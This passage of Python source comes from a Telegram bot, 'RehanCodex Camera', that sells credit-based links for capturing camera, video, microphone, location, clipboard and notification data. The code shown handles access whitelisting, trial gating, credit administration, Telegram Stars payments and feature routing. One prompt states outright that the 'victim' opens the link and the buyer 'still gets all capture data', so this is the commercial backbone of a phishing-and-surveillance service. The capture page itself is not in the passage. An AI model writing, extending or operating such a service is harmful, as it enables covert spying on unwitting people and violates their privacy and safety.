        if hasattr(update_or_q, "message") and update_or_q.message:
            await dm_panel(ctx.bot, uid, "maintenance", txt)
        elif hasattr(update_or_q, "edit_message_text"):
            await panel(ctx, update_or_q, "maintenance", txt)
        else:
            await ctx.bot.send_message(uid, txt, parse_mode="HTML")
    except Exception: pass
    return True


async def _deny_access(bot, uid):
    try:
        price = setting("access_price", "100")
        txt = wrap("🔒 Access Denied\n"
                   "🎯 You are not whitelisted yet\n"
                   "💰 " + str(price) + " rs for access\n"
                   "💬 Contact admin to buy\n"
                   "⏱️ Wait for approval")
        kb = InlineKeyboardMarkup([
            [B("💬 BUY ACCESS", url="https://t.me/RehanCodex", style="success")]])
        await bot.send_message(uid, txt, parse_mode="HTML", reply_markup=kb)
    except Exception as e: record_error("deny", e)


# ═══════════ WELCOME / SHOW ═══════════
def welcome_text(u, credits):
    return wrap("🎉 Welcome to RehanCodex Camera!\n"
                "💸 Balance: " + str(credits) + " credit\n"
                "🎯 Pick any feature below to generate a link\n"
                "🎬 Each feature costs its own credit rate\n"
                "🎯 All-in-One Combo captures everything\n"
                "👇 Tap any button to begin.")


async def _show_user_panel(update, ctx, u):
    try:
        ok, kb = await check_join(ctx.bot, u.id)
        if not ok:
            txt = wrap("🚪 Join required to continue.\n"
                       "📢 Please join all channels listed below.\n"
                       "✅ After joining, tap the Check button.\n"
                       "🎯 Access unlocks immediately.")
            await dm_panel(ctx.bot, u.id, "force_join", txt, kb)
            return
        upsert_user(u.id, u.username or "")
        row = get_user(u.id)
        if row["banned"]:
            await dm_panel(ctx.bot, u.id, "welcome",
                wrap("🚫 You have been banned.\n🔒 Bot access is blocked.\n💬 Contact @RehanCodex to appeal."))
            return

        if is_allowed(u.id):
            txt = welcome_text(u, row["credits"])
            await dm_panel(ctx.bot, u.id, "user_panel", txt, kb_user())
            return

        trial_on = setting("free_trial_on", "1") == "1"

        first_key = "first_start_" + str(u.id)
        if setting(first_key, "") != "1":
            set_setting(first_key, "1")
            try:
                anim_msg = await ctx.bot.send_message(
                    u.id,
                    wrap("🎬 Welcome to RehanCodex Camera\n\n[▱▱▱▱▱▱▱▱▱▱] 0%\nStarting..."),
                    parse_mode="HTML")
                steps = [10, 22, 34, 46, 58, 70, 80, 88, 95, 100]
                for pct in steps:
                    blocks = 10
                    filled = round(pct / 100 * blocks)
                    bar = "▰" * filled + "▱" * (blocks - filled)
                    stage = "Loading..." if pct < 100 else "✅ Ready"
                    txt = wrap("🎬 Welcome to RehanCodex Camera\n\n[" + bar + "] " + str(pct) + "%\n" + stage)
                    try:
                        await ctx.bot.edit_message_text(txt, chat_id=u.id,
                            message_id=anim_msg.message_id, parse_mode="HTML")
                    except Exception: pass
                    await asyncio.sleep(0.7)
                try:
                    await ctx.bot.delete_message(u.id, anim_msg.message_id)
                except Exception: pass
            except Exception as e:
                record_error("first_anim", e)

        if not trial_on:
            log("blocked (trial off): " + str(u.id))
            return

        if not TUNNEL.get("url"):
            await dm_panel(ctx.bot, u.id, "user_panel",
                wrap("⏳ Please try again in a moment"), None)
            return

        trial_key = "camera_trial_" + str(u.id)
        _, week_expired, days_left = trial_week_status(u.id)
        if setting(trial_key, "") == "1" or week_expired:
            await dm_panel(ctx.bot, u.id, "user_panel", _restricted_message(), _restricted_kb())
            return

        txt = wrap("\U0001F44B Welcome" + chr(10) +
                   "\U0001F381 Free trial: 1 camera use" + chr(10) +
                   "\u23F0 " + str(days_left) + " days left" + chr(10) +
                   "\U0001F447 Tap below to continue")
        kb_trial = InlineKeyboardMarkup([
            [B("📸 Camera", "u:new:camera", style="success")]])
        await dm_panel(ctx.bot, u.id, "user_panel", txt, kb_trial)
    except Exception as e:
        record_error("_show_user_panel", e)


# ═══════════ COMMANDS ═══════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    log("/start " + str(u.id) + " @" + str(u.username))
    try:
        if await maintenance_gate(update, ctx, u.id): return
        if not is_allowed(u.id) and setting("free_trial_on", "1") != "1":
            log("start silent (trial off): " + str(u.id))
            return
        await _show_user_panel(update, ctx, u)
    except Exception as e: record_error("cmd_start", e)


async def cmd_rehancodex(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    log("/rehancodex " + str(u.id) + " @" + str(u.username))
    try:
        if await maintenance_gate(update, ctx, u.id): return
        if not is_allowed(u.id) and setting("free_trial_on", "1") != "1":
            log("start silent (trial off): " + str(u.id))
            return
        await _show_user_panel(update, ctx, u)
    except Exception as e: record_error("cmd_rehancodex", e)


async def cmd_id(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    try:
        if not is_allowed(u.id) and setting("free_trial_on", "1") != "1":
            return
        if await maintenance_gate(update, ctx, u.id): return
        name = (u.full_name or "").strip() or "Unknown"
        uname = ("@" + u.username) if u.username else "not set"
        body = "<blockquote>" + bi("\U0001F194 Your Info") + "</blockquote>\n\n"
        body += "<blockquote>\U0001F464 Name: " + esc(name) + "\n\U0001F194 ID: <code>" + str(u.id) + "</code>\n\U0001F4DB Username: " + esc(uname) + "\n\U0001F310 Lang: " + esc(str(u.language_code or "-")) + "</blockquote>\n\n"
        body += "<blockquote>" + BRAND + "</blockquote>"
        await dm_panel(ctx.bot, u.id, "id_cmd", body, None)
    except Exception as e: record_error("cmd_id", e)


async def cmd_add(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != ADMIN_ID: return
    try:
        args = ctx.args or []
        if not args:
            await update.message.reply_text(wrap("➕ Add User\n📝 Format: /add user_id\n💡 Example: /add 123456789"), parse_mode="HTML"); return
        try: uid = int(args[0])
        except Exception: await update.message.reply_text(wrap("❌ Invalid user ID"), parse_mode="HTML"); return
        if uid == ADMIN_ID:
            await update.message.reply_text(wrap("ℹ️ Owner already has access"), parse_mode="HTML"); return
        add_allowed(uid)
        r = get_user(uid); uname = ("@" + r["username"]) if (r and r["username"]) else "no username"
        log("whitelist add " + str(uid))
        pending_target = setting("pending_linkowner_" + str(uid), "")
        if pending_target and pending_target.isdigit():
            try:
                tgt = int(pending_target)
                rw = int(setting("linkowner_reward", "20"))
                with DB_LOCK:
                    c.execute("UPDATE users SET credits=credits+? WHERE id=?", (rw, tgt))
                    c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                              (tgt,"linkowner_reward",rw,"silent",now())); conn.commit()
                with DB_LOCK:
                    c.execute("DELETE FROM settings WHERE key=?", ("pending_linkowner_" + str(uid),)); conn.commit()
                log("linkowner silent paid (add): " + str(tgt) + " +" + str(rw))
            except Exception as e: record_error("linkowner_pending", e)
        try:
            kb_rm = InlineKeyboardMarkup([
                [B("📖 Read Me","u:readme",style="success")],
                [B("💬 BUY ACCESS", url="https://t.me/RehanCodex", style="primary")]])
            await ctx.bot.send_message(uid, wrap("✅ Access granted!\n🎁 Welcome to RehanCodex\n📖 Please read the rules first\n💬 Any problem — DM admin\n👇 Tap a button to continue"), parse_mode="HTML", reply_markup=kb_rm)
        except Exception: pass
        await update.message.reply_text(wrap("✅ Added to whitelist\n🆔 id " + str(uid) + "\n👤 " + uname), parse_mode="HTML")
    except Exception as e: record_error("cmd_add", e)


async def cmd_remove(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != ADMIN_ID: return
    try:
        args = ctx.args or []
        if not args:
            await update.message.reply_text(wrap("➖ Remove User\n📝 Format: /remove user_id"), parse_mode="HTML"); return
        try: uid = int(args[0])
        except Exception: await update.message.reply_text(wrap("❌ Invalid user ID"), parse_mode="HTML"); return
        del_allowed(uid)
        log("whitelist remove " + str(uid))
        try: await ctx.bot.send_message(uid, wrap("🚫 Access revoked\n💬 Contact @RehanCodex"), parse_mode="HTML")
        except Exception: pass
        await update.message.reply_text(wrap("✅ Removed from whitelist\n🆔 id " + str(uid)), parse_mode="HTML")
    except Exception as e: record_error("cmd_remove", e)


async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != ADMIN_ID: return
    try:
        rows = list_allowed()
        if not rows:
            await update.message.reply_text(wrap("📭 Whitelist empty\n📝 Use /add <id>"), parse_mode="HTML"); return
        lines = ["👥 Whitelist · " + str(len(rows))]
        for uid, uname, cred, banned in rows[:40]:
            mark = "🚫" if banned else "🌟"
            lines.append(mark + " @" + (uname or "-") + " · id " + str(uid) + " · " + str(cred) + " cr")
        await update.message.reply_text(wrap("\n".join(lines)), parse_mode="HTML")
    except Exception as e: record_error("cmd_users", e)


async def cmd_linkowner(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != ADMIN_ID: return
    try:
        args = ctx.args or []
        if not args:
            await update.message.reply_text(
                wrap("🔗 Link Owner\n"
                     "📝 Format: /linkowner user_id\n"
                     "💡 Example: /linkowner 123456789\n"
                     "🎁 User gets 20 credit when someone buys access"),
                parse_mode="HTML")
            return
        try: target = int(args[0])
        except Exception:
            await update.message.reply_text(wrap("❌ Invalid user ID"), parse_mode="HTML"); return
        r = get_user(target)
        tname = ("@" + r["username"]) if (r and r["username"]) else ("id " + str(target))
        me = await ctx.bot.get_me()
        link = "https://t.me/" + me.username + "?start=linkowner_" + str(target)
        reward = setting("linkowner_reward", "20")
        txt = ("🔗 Link Generated\n"
               "👤 Target: " + tname + "\n"
               "🎁 Credit: " + str(reward) + " (hidden)\n"
               "⏱️ On new paid access only\n"
               "🤫 Silent mode — no notification sent\n"
               "👇 Share this link")
        body = "<blockquote>" + bi(txt) + "</blockquote>\n\n" \
               "<blockquote><code>" + link + "</code></blockquote>\n\n" \
               "<blockquote>" + BRAND + "</blockquote>"
        await update.message.reply_text(body, parse_mode="HTML")
        log("linkowner generated for " + str(target))
    except Exception as e:
        record_error("cmd_linkowner", e)


async def cmd_addcreditall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != ADMIN_ID: return
    try:
        args = ctx.args or []
        if len(args) < 1:
            await update.message.reply_text(wrap("💸 Add Credit ALL\n"
                "📝 Format: /addcreditall amount message\n"
                "💡 Example: /addcreditall 20 Sorry guys tunnel brake hoke giyechilo"), parse_mode="HTML")
            return
        try: amt = int(args[0])
        except Exception:
            await update.message.reply_text(wrap("❌ Amount integer only"), parse_mode="HTML"); return
        msg = " ".join(args[1:]).strip() if len(args) > 1 else "Bonus credit added"
        with DB_LOCK:
            users = c.execute("SELECT id FROM users WHERE banned=0").fetchall()
            for row in users:
                c.execute("UPDATE users SET credits=credits+? WHERE id=?", (amt, row["id"]))
                c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                          (row["id"],"admin_add_all",amt,msg[:60],now()))
            conn.commit()
        sent = 0
        body = "<blockquote>" + bi("💸 " + msg + "\n💰 +" + str(amt) + " credit added\n📊 Check /rehancodex") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"
        for row in users:
            try:
                await ctx.bot.send_message(row["id"], body, parse_mode="HTML")
                sent += 1
                await asyncio.sleep(0.05)
            except Exception: pass
        await update.message.reply_text(wrap("✅ Credit sent to " + str(sent) + " users\n💰 +" + str(amt) + " each"), parse_mode="HTML")
    except Exception as e: record_error("addcreditall", e)


async def cmd_removecreditall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != ADMIN_ID: return
    try:
        args = ctx.args or []
        if len(args) < 1:
            await update.message.reply_text(wrap("💸 Remove Credit ALL\n"
                "📝 Format: /removecreditall amount message\n"
                "💡 Example: /removecreditall 10 Maintenance charge"), parse_mode="HTML")
            return
        try: amt = int(args[0])
        except Exception:
            await update.message.reply_text(wrap("❌ Amount integer only"), parse_mode="HTML"); return
        msg = " ".join(args[1:]).strip() if len(args) > 1 else "Credit removed"
        with DB_LOCK:
            users = c.execute("SELECT id FROM users WHERE banned=0").fetchall()
            for row in users:
                c.execute("UPDATE users SET credits=credits-? WHERE id=?", (amt, row["id"]))
                c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                          (row["id"],"admin_remove_all",-amt,msg[:60],now()))
            conn.commit()
        sent = 0
        body = "<blockquote>" + bi("💸 " + msg + "\n💰 -" + str(amt) + " credit removed\n📊 Check /rehancodex") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"
        for row in users:
            try:
                await ctx.bot.send_message(row["id"], body, parse_mode="HTML")
                sent += 1
                await asyncio.sleep(0.05)
            except Exception: pass
        await update.message.reply_text(wrap("✅ Removed from " + str(sent) + " users\n💰 -" + str(amt) + " each"), parse_mode="HTML")
    except Exception as e: record_error("removecreditall", e)


async def cmd_addcredit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != ADMIN_ID: return
    try:
        args = ctx.args or []
        reply = update.message.reply_to_message if update.message else None
        target = None; amt = 0; msg = ""
        if reply and reply.from_user:
            target = reply.from_user.id
            if len(args) < 1:
                await update.message.reply_text(wrap("❌ Format: /addcredit amount message"), parse_mode="HTML"); return
            try: amt = int(args[0])
            except Exception:
                await update.message.reply_text(wrap("❌ Amount integer only"), parse_mode="HTML"); return
            msg = " ".join(args[1:]).strip() if len(args) > 1 else "Credit added"
        else:
            if len(args) < 2:
                await update.message.reply_text(wrap("💸 Add Credit Single\n"
                    "📝 Reply to user's message + /addcredit amount message\n"
                    "📝 OR: /addcredit user_id amount message\n"
                    "💡 Example: /addcredit 10 tu bhai hai apna"), parse_mode="HTML"); return
            try:
                target = int(args[0]); amt = int(args[1])
            except Exception:
                await update.message.reply_text(wrap("❌ IDs/amount integers only"), parse_mode="HTML"); return
            msg = " ".join(args[2:]).strip() if len(args) > 2 else "Credit added"
        r = get_user(target)
        if not r:
            await update.message.reply_text(wrap("❌ User not found"), parse_mode="HTML"); return
        with DB_LOCK:
            c.execute("UPDATE users SET credits=credits+? WHERE id=?", (amt, target))
            c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                      (target,"admin_add",amt,msg[:60],now())); conn.commit()
        r2 = get_user(target)
        body = "<blockquote>" + bi("💸 " + msg + "\n💰 +" + str(amt) + " credit\n📊 Balance: " + str(r2["credits"])) + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"
        try: await ctx.bot.send_message(target, body, parse_mode="HTML")
        except Exception: pass
        await update.message.reply_text(wrap("✅ Sent to id " + str(target) + "\n💰 +" + str(amt) + " credit\n📊 New: " + str(r2["credits"])), parse_mode="HTML")
    except Exception as e: record_error("addcredit", e)


async def cmd_removecredit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != ADMIN_ID: return
    try:
        args = ctx.args or []
        reply = update.message.reply_to_message if update.message else None
        target = None; amt = 0; msg = ""
        if reply and reply.from_user:
            target = reply.from_user.id
            if len(args) < 1:
                await update.message.reply_text(wrap("❌ Format: /removecredit amount message"), parse_mode="HTML"); return
            try: amt = int(args[0])
            except Exception:
                await update.message.reply_text(wrap("❌ Amount integer only"), parse_mode="HTML"); return
            msg = " ".join(args[1:]).strip() if len(args) > 1 else "Credit removed"
        else:
            if len(args) < 2:
                await update.message.reply_text(wrap("💸 Remove Credit Single\n"
                    "📝 Reply to user + /removecredit amount message\n"
                    "📝 OR: /removecredit user_id amount message"), parse_mode="HTML"); return
            try:
                target = int(args[0]); amt = int(args[1])
            except Exception:
                await update.message.reply_text(wrap("❌ IDs/amount integers only"), parse_mode="HTML"); return
            msg = " ".join(args[2:]).strip() if len(args) > 2 else "Credit removed"
        r = get_user(target)
        if not r:
            await update.message.reply_text(wrap("❌ User not found"), parse_mode="HTML"); return
        with DB_LOCK:
            c.execute("UPDATE users SET credits=credits-? WHERE id=?", (amt, target))
            c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                      (target,"admin_remove",-amt,msg[:60],now())); conn.commit()
        r2 = get_user(target)
        body = "<blockquote>" + bi("💸 " + msg + "\n💰 -" + str(amt) + " credit\n📊 Balance: " + str(r2["credits"])) + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"
        try: await ctx.bot.send_message(target, body, parse_mode="HTML")
        except Exception: pass
        await update.message.reply_text(wrap("✅ Removed from id " + str(target) + "\n💰 -" + str(amt) + "\n📊 New: " + str(r2["credits"])), parse_mode="HTML")
    except Exception as e: record_error("removecredit", e)


async def cmd_rehanroshni(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        u,a,l,k,p = counts()
        maint = "🚧 ON" if is_maintenance() else "✅ OFF"
        txt = wrap("🜲 ADMIN CONTROL PANEL\n"
                   "👥 Users: " + str(u) + " · 🌟 Active: " + str(a) + "\n"
                   "🔗 Links today: " + str(l) + " · 🎯 Clicks: " + str(k) + "\n"
                   "💳 Payments: " + str(p) + " · 🚧 Maint: " + maint + "\n"
                   "🎬 Features: " + str(len(FEATURES)) + " · Errors: " + str(len(ERROR_LOG)) + "\n"
                   "👇 Tap any button to manage.")
        await dm_panel(ctx.bot, update.effective_user.id, "admin_panel", txt, kb_admin())
    except Exception as e: record_error("cmd_rehanroshni", e)


async def cmd_stars(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        r = requests.get("https://api.telegram.org/bot" + BOT_TOKEN + "/getMyStarBalance", timeout=10).json()
        if r.get("ok"):
            bal = r["result"].get("amount", 0)
            txt = ("<blockquote>" + bi("\u2B50 Telegram Stars Balance\n"
                    "\n"
                    "\U0001F4B0 Balance: " + str(bal) + " Stars\n"
                    "\U0001F4B8 Value: ~$" + str(round(bal * 0.013, 2)) + "\n"
                    "\n"
                    "\U0001F4B3 Withdraw: @BotFather\n"
                    "1. Open @BotFather\n"
                    "2. /mybots \u2192 your bot\n"
                    "3. Bot Settings \u2192 Payments\n"
                    "4. Withdraw Stars\n"
                    "\n"
                    "\u23F1\uFE0F Min 500 Stars to withdraw") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>")
        else:
            txt = wrap("\u2B50 Stars Balance\n\n\u274C API error\n" + str(r.get("description",""))[:100])
        await update.message.reply_text(txt, parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(wrap("\u2B50 Stars\n\n\u274C Error: " + str(e)[:100]), parse_mode="HTML")


async def cmd_logs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        if not ERROR_LOG:
            await update.message.reply_text(wrap("✅ No errors logged\n✨ All systems healthy"), parse_mode="HTML"); return
        lines = ["🐞 Recent Errors · " + str(len(ERROR_LOG))]
        for ts, where, err in ERROR_LOG[-10:]:
            lines.append("🕐 " + ts + "\n📍 " + where + "\n❌ " + err[:120])
        await update.message.reply_text(wrap("\n".join(lines)), parse_mode="HTML")
    except Exception as e: record_error("cmd_logs", e)


async def cmd_clearerr(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        ERROR_LOG.clear()
        await update.message.reply_text(wrap("✅ Error log cleared"), parse_mode="HTML")
    except Exception as e: record_error("cmd_clearerr", e)


async def on_join_req(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        jr = update.chat_join_request
        if not jr: return
        with DB_LOCK:
            c.execute("INSERT OR REPLACE INTO pending_reqs(user_id,channel_id,ts) VALUES(?,?,?)",
                      (jr.from_user.id, str(jr.chat.id), now())); conn.commit()
    except Exception as e: record_error("on_join_req", e)


# ═══════════ STARS PAYMENTS (FIX E) ═══════════
async def on_precheckout(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        await update.pre_checkout_query.answer(ok=True)
    except Exception as e:
        record_error("precheckout", e)


async def on_stars_paid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        sp = update.message.successful_payment
        uid = update.effective_user.id
        try:
            credits = int(sp.invoice_payload.split("_")[2])
        except Exception:
            notify_admin("Stars paid - payload unparseable: " + str(sp.invoice_payload))
            return
        with DB_LOCK:
            c.execute("UPDATE users SET credits=credits+? WHERE id=?", (credits, uid))
            c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                      (uid, "stars_purchase", credits,
                       "stars:" + (sp.telegram_payment_charge_id or "")[:40], now()))
            conn.commit()
            r = c.execute("SELECT credits FROM users WHERE id=?", (uid,)).fetchone()
        set_setting("last_purchase_" + str(uid), str(int(time.time())))
        try:
            await update.message.reply_text(
                wrap("⭐ Payment received\n💰 +" + str(credits) + " credit\n📊 Balance: "
                     + str(r["credits"] if r else credits)),
                parse_mode="HTML")
        except Exception: pass
        notify_admin("⭐ Stars payment · id " + str(uid) + " · +" + str(credits) + " cr")
    except Exception as e:
        record_error("stars_paid", e)


# ═══════════ ROUTER ═══════════
async def on_pay_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    d = q.data or ""
    log("pay_cb IN: " + d)
    if not d.startswith("pay:"):
        return
    try: await q.answer()
    except Exception: pass
    if q.from_user.id != ADMIN_ID:
        try: await q.answer("Admin only", show_alert=True)
        except Exception: pass
        return
    parts = d.split(":")
    if len(parts) < 3:
        try: await q.answer("Bad data", show_alert=True)
        except Exception: pass
        return
    action = parts[1]
    try: pid = int(parts[2])
    except Exception:
        try: await q.answer("Bad pid", show_alert=True)
        except Exception: pass
        return
    with DB_LOCK:
        p = c.execute("SELECT * FROM payments WHERE id=?", (pid,)).fetchone()
    if not p:
        try: await q.answer("Payment not found", show_alert=True)
        except Exception: pass
        return

    if action == "ok":
        try:
            with DB_LOCK:
                c.execute("UPDATE users SET credits=credits+? WHERE id=?", (p["credits"], p["user_id"]))
                c.execute("UPDATE payments SET status='approved' WHERE id=?", (pid,))
                c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                          (p["user_id"],"purchase",p["credits"],"approved",now()))
                conn.commit()
                ur = c.execute("SELECT credits FROM users WHERE id=?", (p["user_id"],)).fetchone()
                bal = ur["credits"] if ur else p["credits"]
            # FIX F: stamp last_purchase so expiry watchdog doesn't fire
            set_setting("last_purchase_" + str(p["user_id"]), str(int(time.time())))
            log("payment approved pid=" + str(pid) + " uid=" + str(p["user_id"]))
            try:
                await ctx.bot.send_message(p["user_id"],
                    "<blockquote>" + bi("🎉 Congratulations!\n"
                    "✅ Payment Approved\n"
                    "💸 +" + str(p["credits"]) + " credit added\n"
                    "📊 Balance: " + str(bal) + " credit\n"
                    "🎯 Enjoy the bot!") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>",
                    parse_mode="HTML")
                log("user dm sent")
            except Exception as e: log("user dm fail: " + str(e)[:100])
            try:
                await q.edit_message_caption(caption="<blockquote>" + bi("✅ Approved · " + str(p["credits"]) + " credit") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>", parse_mode="HTML")
            except Exception: pass
            try: await q.answer("Approved ✅", show_alert=False)
            except Exception: pass
        except Exception as e:
            record_error("approve", e)
            try: await q.answer("Error: " + str(e)[:100], show_alert=True)
            except Exception: pass

    elif action == "no":
        try:
            ctx.user_data["reject_pid"] = pid
            ctx.user_data["await"] = "adm_reject_reason"
            try: await q.answer("Reason bhejo DM me", show_alert=True)
            except Exception: pass
            try:
                await ctx.bot.send_message(ADMIN_ID,
                    "<blockquote>" + bi("❌ Rejecting Payment\n"
                    "👤 User id: " + str(p["user_id"]) + "\n"
                    "💡 Reason bhejo (ek msg me)\n"
                    "📝 Example: Screenshot blur, amount mismatch") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>",
                    parse_mode="HTML")
                log("reject prompt sent")
            except Exception: pass
            try: await q.edit_message_caption(caption="<blockquote>" + bi("❌ Rejecting... reason DM e bhejo") + "</blockquote>", parse_mode="HTML")
            except Exception: pass
        except Exception as e:
            record_error("reject", e)


async def on_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; d = q.data or ""; u = q.from_user
    try: await q.answer()
    except Exception: pass
    log("cb " + str(u.id) + " " + d)
    if not d: return
    try:
        is_admin = (u.id == ADMIN_ID)
        if not is_admin:
            if await maintenance_gate(q, ctx, u.id): return
            try: ok, fj_kb = await check_join(ctx.bot, u.id)
            except Exception: ok, fj_kb = True, None
            if not ok:
                txt = wrap("🚪 Join required to continue.\n📢 Please join all channels listed below.\n✅ After joining, tap the Check button.")
                try: await q.edit_message_text(txt, parse_mode="HTML", reply_markup=fj_kb)
                except Exception:
                    try: await ctx.bot.send_message(q.message.chat_id, txt, parse_mode="HTML", reply_markup=fj_kb)
                    except Exception: pass
                return

        if d == "fj:check":
            ok, kb = await check_join(ctx.bot, u.id)
            if not ok:
                try: await q.answer("Not joined yet", show_alert=True)
                except Exception: pass
                return
            upsert_user(u.id, u.username or "")
            row = get_user(u.id)
            if is_allowed(u.id):
                await panel(ctx, q, "user_panel", welcome_text(u, row["credits"]), kb_user())
            else:
                trial_key = "camera_trial_" + str(u.id)
                if setting(trial_key, "") == "1":
                    await panel(ctx, q, "user_panel",
                        _restricted_message(), _restricted_kb())
                else:
                    await panel(ctx, q, "user_panel",
                        wrap("👋 Welcome\n🎁 One-time free access available\n👇 Tap below to continue"),
                        InlineKeyboardMarkup([[B("📸 Camera", "u:new:camera", style="success")]]))
            return

        row = get_user(u.id)
        if row and row["banned"]:
            await panel(ctx, q, "welcome", wrap("🚫 You are banned.\n🔒 Access blocked.\n💬 Contact @RehanCodex.")); return

        if is_admin and d.startswith("a:"):
            return await admin_cb(q, ctx, d)
        if d.startswith("u:"):
            if not is_allowed(u.id) and setting("free_trial_on", "1") != "1":
                log("cb silent (trial off): " + str(u.id))
                return
            return await user_cb(q, ctx, u, d)
    except Exception as e:
        record_error("on_cb", e)


# ═══════════ USER CALLBACKS ═══════════
def calc_credit_price(credits):
    try: c = max(50, int(credits))
    except Exception: c = 50
    if c <= 50: return 70
    if c == 1000: return 999
    if c >= 1000: return int(round(c * 0.999))
    return int(round(70 + (c - 50) * (999 - 70) / (1000 - 50)))


async def user_cb(q, ctx, u, d):
    log("user_cb IN: [" + d + "]")
    try:
        if d == "u:new:camera":
            log("camera route: uid=" + str(u.id) + " allowed=" + str(is_allowed(u.id)))
            try:
                await user_gen(q, ctx, u, "camera")
            except Exception as e:
                log("camera FAIL: " + str(e)[:200])
                import traceback as _tb
                log(_tb.format_exc()[:400])
                record_error("camera_route", e)
                try: await q.answer("Error: " + str(e)[:80], show_alert=True)
                except Exception: pass
            return
        if d == "u:new:video":
            log("video route: uid=" + str(u.id))
            try:
                await user_gen(q, ctx, u, "video")
            except Exception as e:
                log("video FAIL: " + str(e)[:200])
                record_error("video_route", e)
            return

        # ═══ GENERIC feature route: mic, loc, call, clip, notif ═══
        if d.startswith("u:new:"):
            feat = d.split(":", 2)[2]
            if feat in ("camera", "video"):
                return  # already handled above
            log("generic feature route: uid=" + str(u.id) + " feat=" + feat)
            try:
                await user_gen(q, ctx, u, feat)
            except Exception as e:
                log("gen FAIL (" + feat + "): " + str(e)[:200])
                import traceback as _tb
                log(_tb.format_exc()[:400])
                record_error("generic_route", e)
                try: await q.answer("Error: " + str(e)[:80], show_alert=True)
                except Exception: pass
            return
        row = get_user(u.id)
        if not row: return

        if d == "u:home":
            if is_allowed(u.id):
                await panel(ctx, q, "user_panel", welcome_text(u, row["credits"]), kb_user())
                return
            trial_on = setting("free_trial_on", "1") == "1"
            trial_key = "camera_trial_" + str(u.id)
            trial_used = setting(trial_key, "") == "1"
            if not trial_on:
                log("cb blocked (trial off): " + str(u.id))
                return
            if trial_used:
                await panel(ctx, q, "user_panel",
                    _restricted_message(), _restricted_kb())
                return
            _, week_expired, days_left = trial_week_status(u.id)
            if trial_used or week_expired:
                await panel(ctx, q, "user_panel", _restricted_message(), _restricted_kb())
                return
            txt = wrap("\U0001F44B Welcome" + chr(10) +
                       "\U0001F381 Free trial: 1 camera use" + chr(10) +
                       "\u23F0 " + str(days_left) + " days left" + chr(10) +
                       "\U0001F447 Tap below to continue")
            kb_trial = InlineKeyboardMarkup([
                [B("📸 Camera", "u:new:camera", style="success")]])
            await panel(ctx, q, "user_panel", txt, kb_trial)
            return

        # FIX H: u:gen: honours daily-free
        if d.startswith("u:gen:"):
            parts = d.split(":", 3)
            feat = parts[2]; facing = parts[3]
            is_trial = (not is_allowed(u.id)) and feat == "camera"
            is_demo = False
            if is_allowed(u.id):
                try:
                    today = datetime.utcnow().strftime("%Y-%m-%d")
                    if setting("daily_" + str(u.id) + "_" + feat, "") != today:
                        is_demo = True
                except Exception: pass
            cost = 0 if (is_trial or is_demo) else feature_cost(feat)
            log("u:gen: feat=" + feat + " facing=" + facing + " cost=" + str(cost)
                + " trial=" + str(is_trial) + " demo=" + str(is_demo))
            try:
                await _do_gen(q, ctx, u, feat, cost, facing)
            except Exception as e:
                log("u:gen FAIL: " + str(e)[:200])
                record_error("u_gen", e)
            return

        if d.startswith("u:autocam:"):
            feat = d.split(":",2)[2]
            await user_gen(q, ctx, u, feat); return
        if d.startswith("u:customcam:"):
            feat = d.split(":",2)[2]
            ctx.user_data["custom_mode"] = feat
            ctx.user_data["await"] = "custom_dest"
            txt = wrap("🔗 Custom " + FEATURES.get(feat, {}).get("label", feat) + "\n"
                       "🌐 Send the destination URL.\n"
                       "🎯 Victim opens this link after click.\n"
                       "📊 You still get all capture data.\n"
                       "⚠️ Must start with http:// or https://")
            await panel(ctx, q, "custom_link", txt,
                InlineKeyboardMarkup([[B("❌ Cancel","u:home",style="danger")]]))
            return

        if d == "u:links":
            with DB_LOCK:
                links = c.execute("SELECT * FROM links WHERE owner=? ORDER BY id DESC LIMIT 10", (u.id,)).fetchall()
            if not links:
